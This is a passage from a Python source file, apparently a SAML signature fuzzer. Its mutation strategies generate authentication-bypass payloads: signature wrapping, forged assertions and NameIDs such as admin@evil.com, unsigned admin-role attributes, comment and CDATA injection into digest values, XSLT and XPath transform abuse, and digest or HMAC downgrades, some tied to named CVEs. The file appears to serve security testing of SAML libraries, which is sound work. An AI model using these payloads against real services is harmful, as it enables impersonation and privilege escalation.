            # prefix<saml:NameQualifier>domain</saml:NameQualifier>tail
            new_content = (
                prefix
                + b"<saml:NameQualifier>"
                + qualifier
                + b"</saml:NameQualifier>"
                + tail
            )
        else:
            # prefix<?pi qualifier?>tail → parser-dependent tail handling
            new_content = prefix + b"<?pi " + qualifier + b"?>" + tail

        return bytearray(
            bytes(data[:m.start(2)]) + new_content + bytes(data[m.end(2):])
        )

    def _multi_nameid(self, data: bytearray) -> bytearray | None:
        """Multiple NameID injection (I2).

        Inserts additional NameID elements in the same assertion to
        test which NameID each library selects:
        - find() → first match
        - findAll()[0] → first match
        - XPath .//NameID → first in document order
        - getElementsByTagName → first match

        Different insertion points may cause different selection.
        """
        m = _RE_NAMEID.search(data)
        if not m:
            return None

        evil = self.rng.choice(EVIL_NAMEIDS)
        evil_nameid = (
            b'<saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">'
            + evil
            + b"</saml:NameID>"
        )

        mode = self.rng.choice([
            "before",            # evil NameID before original
            "after",             # evil NameID after original
            "outside_subject",   # evil NameID outside Subject but in assertion
        ])

        if mode == "before":
            return bytearray(
                bytes(data[:m.start(0)]) + evil_nameid + bytes(data[m.start(0):])
            )
        elif mode == "after":
            return bytearray(
                bytes(data[:m.end(0)]) + evil_nameid + bytes(data[m.end(0):])
            )
        else:
            # Insert outside Subject, directly under Assertion
            assertion_m = _RE_ASSERTION_CLOSE.search(data)
            if not assertion_m:
                return None
            return bytearray(
                bytes(data[:assertion_m.start()])
                + evil_nameid
                + bytes(data[assertion_m.start():])
            )

    def _inclusive_ns_manipulate(self, data: bytearray) -> bytearray | None:
        """InclusiveNamespaces PrefixList manipulation (I3).

        Manipulates the InclusiveNamespaces element in exc-c14n transforms
        to trigger c14n divergence between libraries. lxml has known bugs
        with InclusiveNamespaces PrefixList handling.
        """
        # Must have exc-c14n transform
        if b"xml-exc-c14n#" not in data:
            return None

        inc_ns_re = re.compile(
            rb'(<(?:ec:|)InclusiveNamespaces\s+PrefixList=")(.*?)(")',
            re.IGNORECASE | re.DOTALL,
        )

        mode = self.rng.choice([
            "add_prefix",
            "empty",
            "default",
            "inject_new",
        ])

        m = inc_ns_re.search(data)

        if m:
            # Modify existing InclusiveNamespaces
            if mode == "add_prefix":
                # Add non-existent prefix
                new_val = m.group(2) + b" evil xsi foo"
                return bytearray(
                    bytes(data[:m.start(2)]) + new_val + bytes(data[m.end(2):])
                )
            elif mode == "empty":
                return bytearray(
                    bytes(data[:m.start(2)]) + b"" + bytes(data[m.end(2):])
                )
            elif mode == "default":
                new_val = m.group(2) + b" #default"
                return bytearray(
                    bytes(data[:m.start(2)]) + new_val + bytes(data[m.end(2):])
                )
            else:
                new_val = b"saml ds samlp #default"
                return bytearray(
                    bytes(data[:m.start(2)]) + new_val + bytes(data[m.end(2):])
                )
        else:
            # No existing InclusiveNamespaces — inject one after exc-c14n Transform
            exc_c14n_re = re.compile(
                rb'(<ds:Transform\s+Algorithm="http://www\.w3\.org/2001/10/xml-exc-c14n#")\s*(/?>)',
                re.IGNORECASE | re.DOTALL,
            )
            tm = exc_c14n_re.search(data)
            if not tm:
                return None

            if tm.group(2) == b"/>":
                # Self-closing — need to change to open/close with child
                prefix_list = self.rng.choice([
                    b"saml ds",
                    b"#default",
                    b"saml ds samlp xsi",
                    b"",
                ])
                inject = (
                    tm.group(1) + b">"
                    + b'<ec:InclusiveNamespaces '
                    + b'xmlns:ec="http://www.w3.org/2001/10/xml-exc-c14n#" '
                    + b'PrefixList="' + prefix_list + b'"/>'
                    + b"</ds:Transform>"
                )
                return bytearray(
                    bytes(data[:tm.start()]) + inject + bytes(data[tm.end():])
                )
            else:
                # Has closing tag — inject child
                prefix_list = self.rng.choice([
                    b"saml ds",
                    b"#default",
                    b"saml ds samlp xsi",
                    b"",
                ])
                inject = (
                    b'<ec:InclusiveNamespaces '
                    b'xmlns:ec="http://www.w3.org/2001/10/xml-exc-c14n#" '
                    b'PrefixList="' + prefix_list + b'"/>'
                )
                pos = tm.end()
                return bytearray(
                    bytes(data[:pos]) + inject + bytes(data[pos:])
                )

    def _assertion_id_collision(self, data: bytearray) -> bytearray | None:
        """Assertion ID collision (I4).

        Insert an evil assertion with the SAME ID as the signed assertion.
        Tests which assertion each library selects when Reference URI
        matches multiple elements:
        - getElementById: typically first in document order
        - XPath id(): implementation-dependent
        - libxml2: ID caching → first registered element

        Unlike _libxml2_id_caching which targets a specific CVE, this
        strategy creates full evil assertions with the matching ID and
        works with the assertion_id oracle to verify selection.
        """
        # Find original assertion ID
        assertion_m = _RE_ASSERTION_OPEN.search(data)
        if not assertion_m:
            return None

        id_re = re.compile(rb'\bID="([^"]+)"')
        id_m = id_re.search(assertion_m.group(0))
        if not id_m:
            return None

        original_id = id_m.group(1)

        # Build evil assertion with SAME ID
        evil_nameid = self.rng.choice(EVIL_NAMEIDS)
        evil_assertion = (
            b'<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"'
            b' Version="2.0" ID="' + original_id + b'"'
            b' IssueInstant="2026-01-01T00:00:00Z">'
            b"<saml:Issuer>https://idp.example.com</saml:Issuer>"
            b"<saml:Subject>"
            b'<saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">'
            + evil_nameid +
            b"</saml:NameID>"
            b"</saml:Subject>"
            b"</saml:Assertion>"
        )

        mode = self.rng.choice([
            "before_assertion",
            "after_assertion",
            "in_extensions",
        ])

        if mode == "before_assertion":
            return bytearray(
                bytes(data[:assertion_m.start()])
                + evil_assertion + b"\n"
                + bytes(data[assertion_m.start():])
            )
        elif mode == "after_assertion":
            assertion_close = _RE_ASSERTION_CLOSE.search(data)
            if not assertion_close:
                return None
            pos = assertion_close.end()
            return bytearray(
                bytes(data[:pos]) + b"\n" + evil_assertion + bytes(data[pos:])
            )
        else:
            # Wrap original in Extensions, put evil in original position
            assertion_span = _find_element_span(
                data, _RE_ASSERTION_OPEN, _RE_ASSERTION_CLOSE
            )
            if not assertion_span:
                return None
            original_assertion = bytes(data[assertion_span[0]:assertion_span[1]])
            return bytearray(
                bytes(data[:assertion_span[0]])
                + evil_assertion + b"\n"
                + XSW_EXTENSIONS_PREFIX
                + original_assertion
                + XSW_EXTENSIONS_SUFFIX
                + bytes(data[assertion_span[1]:])
            )

    # ══════════════════════════════════════════════════════════════
    # J: Breakthrough Consensus Strategies
    # ══════════════════════════════════════════════════════════════

    def _sibling_attribute_inject(self, data: bytearray) -> bytearray | None:
        """Inject unsigned AttributeStatement as sibling before </samlp:Response>.

        The injected attributes (e.g., role=admin) sit outside the signed
        Assertion.  SPs that extract attributes via //AttributeValue XPath
        on the full document (not scoped to the signed Assertion) will pick
        up the attacker-controlled values.
        """
        m = _RE_RESPONSE_CLOSE.search(data)
        if not m:
            return None
        attr_name = self.rng.choice([b"role", b"isAdmin", b"groups", b"memberOf"])
        attr_val = self.rng.choice([b"admin", b"superadmin", b"root", b"true"])
        inject = (
            b'<saml:AttributeStatement xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">'
            b'<saml:Attribute Name="' + attr_name + b'">'
            b"<saml:AttributeValue>" + attr_val + b"</saml:AttributeValue>"
            b"</saml:Attribute>"
            b"</saml:AttributeStatement>\n"
        )
        pos = m.start()
        return bytearray(bytes(data[:pos]) + inject + bytes(data[pos:]))

    def _saml11_namespace_downgrade(self, data: bytearray) -> bytearray | None:
        """Replace SAML 2.0 assertion namespace with SAML 1.1.

        Some libraries fall back to SAML 1.x processing which has fewer
        security checks (no AudienceRestriction enforcement, looser
        signature scoping).
        """
        saml20 = b"urn:oasis:names:tc:SAML:2.0:assertion"
        saml11 = b"urn:oasis:names:tc:SAML:1.1:assertion"
        if saml20 not in bytes(data):
            return None
        result = bytearray(bytes(data).replace(saml20, saml11, 1))
        return result if result != data else None

    def _signature_relocation_to_response(self, data: bytearray) -> bytearray | None:
        """Move Signature from inside Assertion to Response level.

        Exploits CVE-2024-8698 class: libraries that verify the Response-level
        Signature but extract identity from the (now unsigned) Assertion.
        The Signature still references the Assertion by URI, but its DOM
        position changes — some libraries scope verification to the
        Signature's parent element.
        """
        # Find Signature inside Assertion
        a_span = _find_element_span(data, _RE_ASSERTION_OPEN, _RE_ASSERTION_CLOSE)
        if not a_span:
            return None
        assertion_bytes = bytes(data[a_span[0]:a_span[1]])
        sig_span = _find_element_span(
            bytearray(assertion_bytes), _RE_SIGNATURE_OPEN, _RE_SIGNATURE_CLOSE
        )
        if not sig_span:
            return None
        sig_bytes = assertion_bytes[sig_span[0]:sig_span[1]]
        # Remove Signature from Assertion
        stripped_assertion = assertion_bytes[:sig_span[0]] + assertion_bytes[sig_span[1]:]
        # Insert Signature before </samlp:Response>
        resp_close = _RE_RESPONSE_CLOSE.search(data)
        if not resp_close:
            return None
        result = bytearray(
            bytes(data[:a_span[0]])
            + stripped_assertion
            + bytes(data[a_span[1]:resp_close.start()])
            + sig_bytes + b"\n"
            + bytes(data[resp_close.start():])
        )
        return result

    # ══════════════════════════════════════════════════════════════
    # K: SAMLStorm Variant Strategies (65-69)
    #    Target DigestValue/SignatureValue text-node parsing quirks.
    # ══════════════════════════════════════════════════════════════

    def _digestvalue_leading_comment(self, data: bytearray) -> bytearray | None:
        """SAMLStorm firstChild bypass — leading comment in DigestValue.

        Puts an XML comment as the first child of <ds:DigestValue>.
        Libraries using firstChild.data read the comment instead of the
        actual digest, causing signature verification to use a wrong value.
        Unlike strategy 19 (which prepends a comment before the existing
        text), this variant uses a realistic-looking base64 comment body.
        """
        m = _RE_DIGEST_VALUE.search(data)
        if not m:
            return None
        # Choose comment body: looks like valid base64 to confuse parsers
        comment_body = self.rng.choice([
            b"<!-- " + m.group(2).strip() + b" -->",
            b"<!--" + m.group(2).strip() + b"-->",
            b"<!-- AAAA -->",
            b"<!---->",
        ])
        # Replace entire DigestValue content with comment + real value
        new_content = comment_body + m.group(2)
        return bytearray(
            bytes(data[:m.start(2)]) + new_content + bytes(data[m.end(2):])
        )

    def _digestvalue_cdata_wrap(self, data: bytearray) -> bytearray | None:
        """Wrap DigestValue content in CDATA section.

        Some XML parsers normalize CDATA to text nodes, others don't.
        If a library doesn't handle CDATA in DigestValue, it may read
        an empty text node or fail to extract the digest.
        """
        m = _RE_DIGEST_VALUE.search(data)
        if not m:
            return None
        real_value = m.group(2).strip()
        cdata_wrapped = b"<![CDATA[" + real_value + b"]]>"
        return bytearray(
            bytes(data[:m.start(2)]) + cdata_wrapped + bytes(data[m.end(2):])
        )

    def _digestvalue_split_comment(self, data: bytearray) -> bytearray | None:
        """Split DigestValue text node with an internal comment.

        <ds:DigestValue>RE<!---->AL</ds:DigestValue>
        Libraries that concatenate all text children see "REAL",
        but those using firstChild.data only see "RE".
        """
        m = _RE_DIGEST_VALUE.search(data)
        if not m:
            return None
        real_value = m.group(2).strip()
        if len(real_value) < 4:
            return None
        # Split at a random position (but at least 2 chars from each end)
        split_pos = self.rng.randint(2, len(real_value) - 2)
        comment = self.rng.choice([b"<!---->", b"<!-- -->", b"<!--x-->"])
        split_value = real_value[:split_pos] + comment + real_value[split_pos:]
        return bytearray(
            bytes(data[:m.start(2)]) + split_value + bytes(data[m.end(2):])
        )

    def _sigvalue_multi_comment(self, data: bytearray) -> bytearray | None:
        """Inject comments into SignatureValue (multiple variants).

        Extends CVE-2025-29774 with additional comment placement patterns:
        leading, trailing, and split-text variants in SignatureValue.
        """
        m = _RE_SIGNATURE_VALUE.search(data)
        if not m:
            return None
        real_value = m.group(2).strip()
        variant = self.rng.randint(0, 3)
        if variant == 0:
            # Leading comment (firstChild bypass)
            new_val = b"<!-- " + real_value[:8] + b" -->" + real_value
        elif variant == 1:
            # Trailing comment
            new_val = real_value + b"<!---->"
        elif variant == 2:
            # CDATA wrap
            new_val = b"<![CDATA[" + real_value + b"]]>"
        else:
            # Split with comment
            if len(real_value) < 8:
                new_val = b"<!---->" + real_value
            else:
                sp = self.rng.randint(4, len(real_value) - 4)
                new_val = real_value[:sp] + b"<!---->" + real_value[sp:]
        return bytearray(
            bytes(data[:m.start(2)]) + new_val + bytes(data[m.end(2):])
        )

    def _digestvalue_pi_inject(self, data: bytearray) -> bytearray | None:
        """Inject processing instruction into DigestValue.

        <ds:DigestValue><?x?>REAL</ds:DigestValue>
        PIs are a less-tested variant of the firstChild attack vector.
        Some parsers skip PIs when reading text, others don't.
        """
        m = _RE_DIGEST_VALUE.search(data)
        if not m:
            return None
        pi = self.rng.choice([
            b"<?x?>",
            b"<?xml-digest ?>",
            b"<?pi ?>",
            b"<?x " + m.group(2).strip()[:8] + b"?>",
        ])
        return bytearray(
            bytes(data[:m.start(2)]) + pi + bytes(data[m.start(2):])
        )

    # ══════════════════════════════════════════════════════════════
    # L: C14N Edge Case Strategies (70-74)
    #    Exploit canonicalization divergences between libraries.
    # ══════════════════════════════════════════════════════════════

    def _c14n_superfluous_ns(self, data: bytearray) -> bytearray | None:
        """Add unused namespace declarations inside Assertion.

        Exc-c14n should exclude unreferenced namespace declarations, but
        implementations differ in handling. Some include them in the
        canonical form, others don't, leading to different digests.
        """
        m = _RE_ASSERTION_OPEN.search(data)
        if not m:
            return None
        ns_decls = self.rng.choice([
            b' xmlns:unused="http://example.com/unused"',
            b' xmlns:foo="http://foo.bar/ns" xmlns:baz="http://baz.qux/ns"',
            b' xmlns:xenc="http://www.w3.org/2001/04/xmlenc#"',
            b' xmlns:ec="http://www.w3.org/2001/10/xml-exc-c14n#"',
        ])
        pos = m.end() - 1  # Before the closing >
        return bytearray(
            bytes(data[:pos]) + ns_decls + bytes(data[pos:])
        )

    def _c14n_inherited_ns(self, data: bytearray) -> bytearray | None:
        """Add namespace declaration on Response, reference inside Assertion.

        Tests whether c14n correctly handles namespace inheritance when
        the namespace is declared on an ancestor but used in a descendant.
        Exc-c14n should include visibly-utilized namespaces from ancestors.
        """
        # Add xmlns:custom on Response
        m_resp = _RE_RESPONSE_OPEN.search(data)
        if not m_resp:
            return None
        ns_uri = self.rng.choice([
            b"http://custom.example.com/v1",
            b"urn:custom:test:namespace",
            b"http://www.w3.org/1999/xhtml",
        ])
        ns_decl = b' xmlns:custom="' + ns_uri + b'"'
        pos = m_resp.end() - 1
        result = bytearray(
            bytes(data[:pos]) + ns_decl + bytes(data[pos:])
        )
        # Add custom:attr="test" on an element inside Assertion
        m_nameid = _RE_NAMEID.search(result)
        if m_nameid:
            inject_pos = m_nameid.start(1) + len(b"<saml:NameID")
            # Find the end of the opening tag attributes
            tag_end = result.index(b">", inject_pos)
            result = bytearray(
                bytes(result[:tag_end]) + b' custom:attr="test"' + bytes(result[tag_end:])
            )
        return result

    def _c14n_attr_value_normalization(self, data: bytearray) -> bytearray | None:
        """Inject character references (&#13; &#10; &#9;) in attribute values.

        C14N requires attribute value normalization: &#xD;→&#xD;, &#xA;→&#xA;,
        &#x9;→&#x9; in output. Libraries that normalize differently produce
        different canonical forms.
        """
        m = _RE_ASSERTION_OPEN.search(data)
        if not m:
            return None
        # Find an attribute value inside the Assertion opening tag
        tag_text = bytes(data[m.start():m.end()])
        # Inject into Assertion ID attribute value
        id_match = re.search(rb'(ID=")(.*?)(")', tag_text)
        if not id_match:
            return None
        char_ref = self.rng.choice([b"&#13;", b"&#10;", b"&#9;", b"&#xD;", b"&#xA;"])
        old_id = id_match.group(2)
        new_id = old_id + char_ref
        result = bytearray(data)
        # Replace in the assertion opening tag
        abs_start = m.start() + id_match.start(2)
        abs_end = m.start() + id_match.end(2)
        result[abs_start:abs_end] = new_id
        return result

    def _c14n_default_vs_prefixed_ns(self, data: bytearray) -> bytearray | None:
        """Swap prefixed namespace to default namespace on Assertion.

        <saml:Assertion xmlns:saml="..."> → <Assertion xmlns="...">
        Exc-c14n treats default and prefixed namespaces differently.
        This can cause digest mismatches across libraries.
        """
        saml_ns = b"urn:oasis:names:tc:SAML:2.0:assertion"
        m = _RE_ASSERTION_OPEN.search(data)
        if not m:
            return None
        tag = bytes(data[m.start():m.end()])
        # Check it uses saml: prefix
        if not tag.startswith(b"<saml:Assertion"):
            return None
        # Replace <saml:Assertion xmlns:saml="NS" to <Assertion xmlns="NS"
        new_tag = tag.replace(b"<saml:Assertion", b"<Assertion", 1)
        new_tag = new_tag.replace(b'xmlns:saml="' + saml_ns + b'"',
                                   b'xmlns="' + saml_ns + b'"', 1)
        result = bytearray(
            bytes(data[:m.start()]) + new_tag + bytes(data[m.end():])
        )
        # Also replace closing tag
        result = bytearray(bytes(result).replace(b"</saml:Assertion>", b"</Assertion>", 1))
        # Replace saml: prefix on child elements within first assertion
        for child_tag in [b"saml:Issuer", b"saml:Subject", b"saml:Conditions",
                          b"saml:AuthnStatement", b"saml:NameID"]:
            unprefixed = child_tag.replace(b"saml:", b"", 1)
            result = bytearray(bytes(result).replace(
                b"<" + child_tag, b"<" + unprefixed, 1
            ))
            result = bytearray(bytes(result).replace(
                b"</" + child_tag + b">", b"</" + unprefixed + b">", 1
            ))
        return result

    def _c14n_xml_inherited_attrs(self, data: bytearray) -> bytearray | None:
        """Inject xml:lang or xml:space on ancestor element.

        In exc-c14n, xml: attributes are inherited and must be reproduced
        in canonical form. Libraries differ on whether inherited xml:
        attributes from ancestors outside the signed subset are included.
        """
        m_resp = _RE_RESPONSE_OPEN.search(data)
        if not m_resp:
            return None
        xml_attr = self.rng.choice([
            b' xml:lang="en"',
            b' xml:space="preserve"',
            b' xml:lang="de"',
            b' xml:base="http://example.com/"',
        ])
        pos = m_resp.end() - 1
        return bytearray(
            bytes(data[:pos]) + xml_attr + bytes(data[pos:])
        )

    # ══════════════════════════════════════════════════════════════
    # M: Novel Attack Vector (75)
    # ══════════════════════════════════════════════════════════════

    def _xpath_transform_exclude_subject(self, data: bytearray) -> bytearray | None:
        """Inject XPath transform that excludes Subject from digest computation.

        Adds an XPath Transform to the Reference's transform chain that
        evaluates to true for all nodes EXCEPT saml:Subject. If a library
        applies this transform, the Subject (containing NameID) is excluded
        from the digest calculation, allowing the attacker to modify NameID
        freely without invalidating the signature.
        """
        m_transforms = _RE_TRANSFORMS.search(data)
        if not m_transforms:
            return None
        # Build XPath transform that excludes Subject
        xpath_transform = (
            b'<ds:Transform Algorithm="http://www.w3.org/TR/1999/REC-xpath-19991116">'
            b'<ds:XPath xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">'
            b'not(ancestor-or-self::saml:Subject)'
            b'</ds:XPath>'
            b'</ds:Transform>'
        )
        # Insert XPath transform BEFORE the existing transforms
        insert_pos = m_transforms.start(2)
        result = bytearray(
            bytes(data[:insert_pos]) + xpath_transform + bytes(data[insert_pos:])
        )
        # Now modify NameID to attacker value since it should be excluded from digest
        m_nameid = _RE_NAMEID.search(result)
        if m_nameid:
            evil_email = self.rng.choice([
                b"admin@evil.com",
                b"root@attacker.com",
                b"superadmin@evil.com",
            ])
            result = bytearray(
                bytes(result[:m_nameid.start(2)])
                + evil_email
                + bytes(result[m_nameid.end(2):])
            )
        return result

    # ══════════════════════════════════════════════════════════════
    # N: Gap-derived strategies (76-80)
    # ══════════════════════════════════════════════════════════════

    def _encrypted_assertion_wrapping(self, data: bytearray) -> bytearray | None:
        """Wrap legitimate assertion in EncryptedAssertion, inject evil assertion.

        CVE-2024-4985/CVE-2024-9487 class: some libraries extract the first
        plaintext Assertion and ignore the EncryptedAssertion wrapper, allowing
        an attacker to prepend an evil assertion before the wrapped one.
        """
        m_assertion_open = _RE_ASSERTION_OPEN.search(data)
        m_assertion_close = _RE_ASSERTION_CLOSE.search(data)
        if not m_assertion_open or not m_assertion_close:
            return None
        assertion_bytes = bytes(data[m_assertion_open.start():m_assertion_close.end()])
        # Wrap original assertion inside EncryptedAssertion
        wrapped = (
            b'<saml:EncryptedAssertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">'
            + assertion_bytes
            + b'</saml:EncryptedAssertion>'
        )
        # Build evil assertion with attacker NameID
        evil_email = self.rng.choice([
            b"admin@evil.com", b"root@attacker.com", b"superadmin@evil.com",
        ])
        evil_assertion = (
            b'<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"'
            b' ID="_evil_enc" Version="2.0" IssueInstant="2099-01-01T00:00:00Z">'
            b'<saml:Issuer>https://evil.idp</saml:Issuer>'
            b'<saml:Subject><saml:NameID>' + evil_email + b'</saml:NameID></saml:Subject>'
            b'</saml:Assertion>'
        )
        # Replace original assertion with evil + wrapped
        result = bytearray(
            bytes(data[:m_assertion_open.start()])
            + evil_assertion
            + wrapped
            + bytes(data[m_assertion_close.end():])
        )
        return result

    def _digestmethod_only_downgrade(self, data: bytearray) -> bytearray | None:
        """Downgrade only DigestMethod to MD5 while keeping SignatureMethod intact.

        Some libraries (e.g. python3-saml) enforce strong SignatureMethod but
        fail to validate DigestMethod independently, accepting MD5 digests
        with RSA-SHA256 signatures.
        """
        m_digest_method = _RE_DIGEST_METHOD.search(data)
        if not m_digest_method:
            return None
        weak_algos = [
            b"http://www.w3.org/2001/04/xmldsig#md5",
            b"http://www.w3.org/2001/04/xmlenc#ripemd160",
            b"http://www.w3.org/2001/04/xmldsig#sha1",
        ]
        chosen = self.rng.choice(weak_algos)
        # Only replace DigestMethod, leave SignatureMethod untouched
        result = bytearray(
            bytes(data[:m_digest_method.start(2)])
            + chosen
            + bytes(data[m_digest_method.end(2):])
        )
        return result

    def _unicode_identity_confusion(self, data: bytearray) -> bytearray | None:
        """Inject invisible Unicode characters into NameID to cause identity confusion.

        Different XML parsers handle BOM, ZWSP, ZWNJ, soft-hyphen, and line
        separators differently in text content. This can cause one library to
        see 'admin@corp.com' while another sees 'admin\\u200b@corp.com'.
        """
        m_nameid = _RE_NAMEID.search(data)
        if not m_nameid:
            return None
        original = m_nameid.group(2)
        if len(original) < 3:
            return None
        # Invisible Unicode chars (UTF-8 encoded)
        invisible_chars = [
            b'\xe2\x80\x8b',  # U+200B ZERO WIDTH SPACE
            b'\xe2\x80\x8c',  # U+200C ZERO WIDTH NON-JOINER
            b'\xe2\x80\x8d',  # U+200D ZERO WIDTH JOINER
            b'\xc2\xad',      # U+00AD SOFT HYPHEN
            b'\xe2\x80\xa8',  # U+2028 LINE SEPARATOR
            b'\xef\xbb\xbf',  # U+FEFF BOM
            b'\xe2\x81\xa0',  # U+2060 WORD JOINER
            b'\xc2\xa0',      # U+00A0 NO-BREAK SPACE
        ]
        char = self.rng.choice(invisible_chars)
        # Insert at random position within the NameID value
        pos = self.rng.randint(1, len(original) - 1)
        new_nameid = bytes(original[:pos]) + char + bytes(original[pos:])
        result = bytearray(
            bytes(data[:m_nameid.start(2)])
            + new_nameid
            + bytes(data[m_nameid.end(2):])
        )
        return result

    def _xslt_pre_verification_transform(self, data: bytearray) -> bytearray | None:
        """Inject XSLT transform that modifies document before signature verification.

        Java's javax.xml.crypto processes XSLT transforms within ds:Reference
        BEFORE verifying the digest. An attacker can inject an XSLT transform
        that rewrites assertion content, then the digest is computed on the
        transformed (attacker-controlled) output.
        """
        m_transforms = _RE_TRANSFORMS.search(data)
        if not m_transforms:
            return None
        # XSLT that copies everything but rewrites NameID
        xslt_transforms = [
            # Variant 1: Identity transform with NameID override
            (
                b'<ds:Transform Algorithm="http://www.w3.org/TR/1999/REC-xslt-19991116">'
                b'<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"'
                b' xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">'
                b'<xsl:template match="@*|node()"><xsl:copy><xsl:apply-templates'
                b' select="@*|node()"/></xsl:copy></xsl:template>'
                b'<xsl:template match="saml:NameID/text()">admin@evil.com</xsl:template>'
                b'</xsl:stylesheet></ds:Transform>'
            ),
            # Variant 2: Strip signature elements to bypass enveloped-sig check
            (
                b'<ds:Transform Algorithm="http://www.w3.org/TR/1999/REC-xslt-19991116">'
                b'<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"'
                b' xmlns:ds="http://www.w3.org/2000/09/xmldsig#">'
                b'<xsl:template match="@*|node()"><xsl:copy><xsl:apply-templates'
                b' select="@*|node()"/></xsl:copy></xsl:template>'
                b'<xsl:template match="ds:Signature"/>'
                b'</xsl:stylesheet></ds:Transform>'
            ),
            # Variant 3: EXSLT with system-property probe
            (
                b'<ds:Transform Algorithm="http://www.w3.org/TR/1999/REC-xslt-19991116">'
                b'<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">'
                b'<xsl:template match="/"><xsl:copy-of select="."/></xsl:template>'
                b'</xsl:stylesheet></ds:Transform>'
            ),
        ]
        xslt = self.rng.choice(xslt_transforms)
        # Insert XSLT transform at the beginning of the transform chain
        insert_pos = m_transforms.start(2)
        result = bytearray(
            bytes(data[:insert_pos]) + xslt + bytes(data[insert_pos:])
        )
        return result

    def _void_c14n_enhanced(self, data: bytearray) -> bytearray | None:
        """Enhanced void canonicalization with multiple relative namespace URI patterns.

        Extends the basic void c14n attack (strategy 18/53) with additional
        variants: empty namespace URI, dot-relative URI, fragment-only URI,
        and scheme-relative URI. These test different c14n implementations'
        handling of namespace URIs that resolve to empty or near-empty strings.
        """
        m_assertion = _RE_ASSERTION_OPEN.search(data)
        if not m_assertion:
            return None
        # Various namespace URI patterns that might cause c14n confusion
        ns_variants = [
            b' xmlns:void=""',                         # empty URI
            b' xmlns:void="."',                        # dot-relative
            b' xmlns:void="#"',                        # fragment-only
            b' xmlns:void="//"',                       # scheme-relative empty
            b' xmlns:void="urn:"',                     # bare urn scheme
            b' xmlns:void="data:,"',                   # empty data URI
            b' xmlns:void="\t"',                       # tab char URI
            b' xmlns:void="http://"',                  # scheme-only
        ]
        chosen_ns = self.rng.choice(ns_variants)
        # Inject the namespace declaration into the Assertion opening tag
        insert_pos = m_assertion.end() - 1  # before the closing >
        result = bytearray(
            bytes(data[:insert_pos])
            + chosen_ns
            + bytes(data[insert_pos:])
        )
        return result

    # ══════════════════════════════════════════════════════════════
    # O: XML-DSig spec-derived strategies (81-89)
    #    Based on xmldsig-core-1 §4.3, §4.4, §5.1
    # ══════════════════════════════════════════════════════════════

    def _signedinfo_c14n_swap(self, data: bytearray) -> bytearray | None:
        """Swap SignedInfo CanonicalizationMethod independently from Transform c14n.

        xmldsig-core §4.3.1: CanonicalizationMethod specifies the c14n applied
        to SignedInfo prior to signature calculation. This is INDEPENDENT of the
        c14n used in Reference Transforms. Swapping only SignedInfo c14n tests
        whether libraries compute the SignedInfo hash differently when the
        algorithm changes (inclusive vs exclusive, with/without comments).
        """
        m = _RE_C14N_METHOD.search(data)
        if not m:
            return None
        current = m.group(2)
        # Choose a DIFFERENT algorithm from what's currently set
        alternatives = [a for a in C14N_ALGORITHMS if a != current and a]
        if not alternatives:
            return None
        algo = self.rng.choice(alternatives)
        return bytearray(
            bytes(data[:m.start(2)]) + algo + bytes(data[m.end(2):])
        )

    def _transform_remove_c14n(self, data: bytearray) -> bytearray | None:
        """Remove c14n Transform from Reference, relying on implicit default.

        xmldsig-core §4.3.3.2: When URI yields node-set and next transform
        requires octets, application MUST convert using Canonical XML. Spec warns
        applications SHOULD NOT rely on this default. By removing the explicit
        c14n transform, we test which implicit default each library uses.
        """
        m = _RE_C14N_TRANSFORM.search(data)
        if not m:
            return None
        # Find the full transform element (self-closing or with children)
        # Match from <ds:Transform to /> or </ds:Transform>
        start = m.start()
        rest = bytes(data[start:])
        # Try self-closing first
        sc = re.match(rb'<ds:Transform\s[^>]*/>', rest, re.IGNORECASE | re.DOTALL)
        if sc:
            end = start + sc.end()
        else:
            # Open/close form
            close = re.search(rb'</ds:Transform\s*>', rest, re.IGNORECASE)
            if not close:
                return None
            end = start + close.end()
        return bytearray(bytes(data[:start]) + bytes(data[end:]))

    def _xpointer_comment_preservation(self, data: bytearray) -> bytearray | None:
        """Switch Reference URI from shortname to scheme-based XPointer.

        xmldsig-core §4.3.3.3 step 4: Shortname XPointers (#ID) DELETE comment
        nodes, but scheme-based (#xpointer(id('ID'))) PRESERVE comments. This
        is the root cause of SAMLStorm (CVE-2025-29775). We combine URI change
        with comment injection to test the divergence.
        """
        m = _RE_REFERENCE_URI.search(data)
        if not m:
            return None
        uri = m.group(2)
        if not uri or not uri.startswith(b"#"):
            return None
        frag = uri[1:]  # strip leading #
        if b"xpointer" in frag:
            return None  # already scheme-based
        # Convert to scheme-based XPointer
        new_uri = b"#xpointer(id('" + frag + b"'))"
        result = bytearray(
            bytes(data[:m.start(2)]) + new_uri + bytes(data[m.end(2):])
        )
        # Also inject a comment into DigestValue to exploit comment preservation
        m_dv = _RE_DIGEST_VALUE.search(result)
        if m_dv:
            comment = self.rng.choice(COMMENT_DIGEST_PAYLOADS)
            result = bytearray(
                bytes(result[:m_dv.start(2)])
                + comment + m_dv.group(2)
                + bytes(result[m_dv.end(2):])
            )
        return result

    def _hmac_truncation_attack(self, data: bytearray) -> bytearray | None:
        """Inject HMACOutputLength to truncate HMAC signature.

        xmldsig-core §4.3.2: MUST reject if truncation < max(half hash, 80 bits).
        Libraries that don't enforce this allow brute-forcing a 1-bit HMAC.
        Also swaps SignatureMethod to HMAC to make truncation meaningful.
        """
        m_sig = _RE_SIG_METHOD.search(data)
        if not m_sig:
            return None
        # Set HMAC algorithm
        hmac_algo = b"http://www.w3.org/2001/04/xmldsig-more#hmac-sha256"
        result = bytearray(
            bytes(data[:m_sig.start(2)]) + hmac_algo + bytes(data[m_sig.end(2):])
        )
        # Insert HMACOutputLength after SignatureMethod close tag
        sm_close = re.search(rb'(</ds:SignatureMethod>|<ds:SignatureMethod[^/]*/?>)',
                             result, re.IGNORECASE)
        if not sm_close:
            return result
        truncation = self.rng.choice(HMAC_TRUNCATION_LENGTHS)
        # If self-closing, convert to open/close and insert param
